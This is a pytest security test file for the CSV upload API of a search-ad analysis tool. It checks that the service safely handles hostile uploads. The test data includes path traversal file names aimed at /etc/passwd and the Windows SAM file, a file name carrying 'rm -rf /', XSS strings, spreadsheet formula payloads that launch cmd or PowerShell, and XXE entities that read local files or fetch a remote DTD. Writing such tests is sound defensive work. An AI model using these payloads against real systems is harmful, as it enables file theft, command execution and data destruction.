"""Security tests for file upload functionality."""

from io import BytesIO

import pytest
from fastapi.testclient import TestClient

from paidsearchnav_mcp.api.main import create_app


class TestSecurityValidation:
    """Test class for security validation."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        app = create_app()
        return TestClient(app)

    def test_malicious_filename_injection(self, client):
        """Test protection against malicious filename injection."""
        malicious_filenames = [
            "../../../etc/passwd.csv",
            "..\\..\\windows\\system32\\config\\sam.csv",
            "shell.csv; rm -rf /",
            "<script>alert('xss')</script>.csv",
        ]

        for filename in malicious_filenames:
            files = {"file": (filename, BytesIO(b"test,data\n1,2"), "text/csv")}
            response = client.post("/api/v1/parse-csv", files=files)

            # Should not cause server errors - either accept or reject cleanly
            assert response.status_code in [200, 400, 422]

    def test_csv_injection_protection(self, client):
        """Test protection against CSV injection attacks."""
        csv_injection_payloads = [
            "=cmd|' /C calc'!A0",
            "@SUM(1+9)*cmd|' /C calc'!A0",
            "+cmd|' /C powershell IEX'!A0",
            "-cmd|' /C notepad'!A0",
            '=HYPERLINK("http://malicious.com","Click here")',
            "=1+1+cmd|' /C calc'!A0",
        ]

        for payload in csv_injection_payloads:
            csv_content = f"Campaign,Cost\n{payload},100\nTest Campaign,200"
            csv_bytes = csv_content.encode("utf-8")
            files = {"file": ("test.csv", BytesIO(csv_bytes), "text/csv")}

            response = client.post("/api/v1/analyze-csv", files=files)

            # Should handle safely without execution
            assert response.status_code in [200, 400]

            if response.status_code == 200:
                data = response.json()
                # Check that payload wasn't executed
                assert "sample_data" in data
                # Verify dangerous characters are handled safely
                for sample in data.get("sample_data", []):
                    for value in sample.values():
                        # Should not contain active formulas
                        assert not value.startswith("=")
                        assert not value.startswith("+")
                        assert not value.startswith("-")
                        assert not value.startswith("@")

    def test_binary_file_rejection(self, client):
        """Test rejection of binary files disguised as CSV."""
        binary_files = [
            (b"\x89PNG\r\n\x1a\n", "image/png"),  # PNG header
            (b"PK\x03\x04", "application/zip"),  # ZIP header
            (b"\xff\xd8\xff", "image/jpeg"),  # JPEG header
            (b"%PDF-1.4", "application/pdf"),  # PDF header
        ]

        for binary_content, content_type in binary_files:
            files = {"file": ("malicious.csv", BytesIO(binary_content), content_type)}
            response = client.post("/api/v1/parse-csv", files=files)

            # Should reject non-CSV content types
            assert response.status_code == 400
            assert "Invalid content type" in response.json()["detail"]

    def test_extremely_long_lines(self, client):
        """Test handling of extremely long CSV lines."""
        # Create CSV with very long field values
        long_value = "A" * 10000  # 10KB field
        csv_content = f"Campaign,Description\nTest,{long_value}\n"
        csv_bytes = csv_content.encode("utf-8")
        files = {"file": ("long.csv", BytesIO(csv_bytes), "text/csv")}

        response = client.post("/api/v1/parse-csv", files=files)

        # Should handle gracefully without causing memory issues
        assert response.status_code in [200, 400, 413]

    def test_unicode_and_encoding_attacks(self, client):
        """Test handling of various Unicode and encoding attacks."""
        unicode_payloads = [
            "Campaign\u0000Admin",  # Null byte injection
            "Test\u202eCampaign",  # Right-to-Left Override
            "Campaign\ufeffTest",  # BOM injection
            "Test\u0085Campaign",  # Next Line character
        ]

        for payload in unicode_payloads:
            csv_content = f"Campaign,Cost\n{payload},100\n"
            csv_bytes = csv_content.encode("utf-8")
            files = {"file": ("unicode.csv", BytesIO(csv_bytes), "text/csv")}

            response = client.post("/api/v1/analyze-csv", files=files)

            # Should handle Unicode safely
            assert response.status_code in [200, 400]

    def test_xml_entity_injection(self, client):
        """Test protection against XML entity injection in CSV."""
        xml_payloads = [
            '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;',
            '<!ENTITY % remote SYSTEM "http://malicious.com/evil.dtd">%remote;',
        ]

        for payload in xml_payloads:
            csv_content = f"Campaign,Cost\n{payload},100\n"
            csv_bytes = csv_content.encode("utf-8")
            files = {"file": ("xml.csv", BytesIO(csv_bytes), "text/csv")}

            response = client.post("/api/v1/analyze-csv", files=files)

            # Should handle without XML processing
            assert response.status_code in [200, 400]

    def test_memory_exhaustion_protection(self, client):
        """Test protection against memory exhaustion attacks."""
        # Test with very wide CSV (many columns)
        wide_headers = ",".join([f"col{i}" for i in range(1000)])
        wide_row = ",".join(["data"] * 1000)
        csv_content = f"{wide_headers}\n{wide_row}\n"
        csv_bytes = csv_content.encode("utf-8")
        files = {"file": ("wide.csv", BytesIO(csv_bytes), "text/csv")}

        response = client.post("/api/v1/parse-csv", files=files)

        # Should handle without memory exhaustion
        assert response.status_code in [200, 400, 413]

    def test_nested_zip_bomb_protection(self, client):
        """Test that zip bombs disguised as CSV are rejected."""
        # Simulate compressed content that would expand massively
        suspicious_content = b"x" * 1000 + b"\x00" * 100000  # Highly compressible
        files = {"file": ("bomb.csv", BytesIO(suspicious_content), "text/csv")}

        response = client.post("/api/v1/parse-csv", files=files)

        # Should be caught by file size limits or content validation
        assert response.status_code in [200, 400, 413]

    def test_cors_origin_validation(self, client):
        """Test CORS origin validation."""
        malicious_origins = [
            "http://malicious.com",
            "https://evil.com",
            "null",
            "data:text/html,<script>alert(1)</script>",
        ]

        for origin in malicious_origins:
            headers = {"Origin": origin}
            response = client.options("/api/v1/parse-csv", headers=headers)

            # Should not echo back malicious origins
            allowed_origin = response.headers.get("access-control-allow-origin")
            assert allowed_origin != origin
            assert allowed_origin != "*"

    def test_content_type_spoofing(self, client):
        """Test protection against content-type spoofing."""
        # Try to upload executable disguised as CSV
        exe_content = b"\x4d\x5a"  # PE header for Windows executable
        files = {"file": ("fake.csv", BytesIO(exe_content), "text/csv")}

        response = client.post("/api/v1/parse-csv", files=files)

        # Should detect or handle gracefully
        assert response.status_code in [200, 400, 415]

    def test_rate_limiting_simulation(self, client):
        """Test behavior under rapid requests (simulating DoS)."""
        # Send multiple rapid requests
        responses = []
        for i in range(10):
            csv_content = f"Campaign,Cost\nTest{i},100\n"
            csv_bytes = csv_content.encode("utf-8")
            files = {"file": (f"test{i}.csv", BytesIO(csv_bytes), "text/csv")}
            response = client.post("/api/v1/parse-csv", files=files)
            responses.append(response.status_code)

        # All should be handled gracefully (no 5xx errors from overload)
        assert all(status < 500 for status in responses)

    def test_path_traversal_in_content(self, client):
        """Test path traversal attempts in CSV content."""
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "file:///etc/passwd",
            "/proc/self/environ",
        ]

        for path in path_traversal_attempts:
            csv_content = f"Campaign,File\nTest,{path}\n"
            csv_bytes = csv_content.encode("utf-8")
            files = {"file": ("path.csv", BytesIO(csv_bytes), "text/csv")}

            response = client.post("/api/v1/analyze-csv", files=files)

            # Should process as normal data, not file paths
            assert response.status_code in [200, 400]

            if response.status_code == 200:
                data = response.json()
                # Should not have attempted file system access
                assert "sample_data" in data
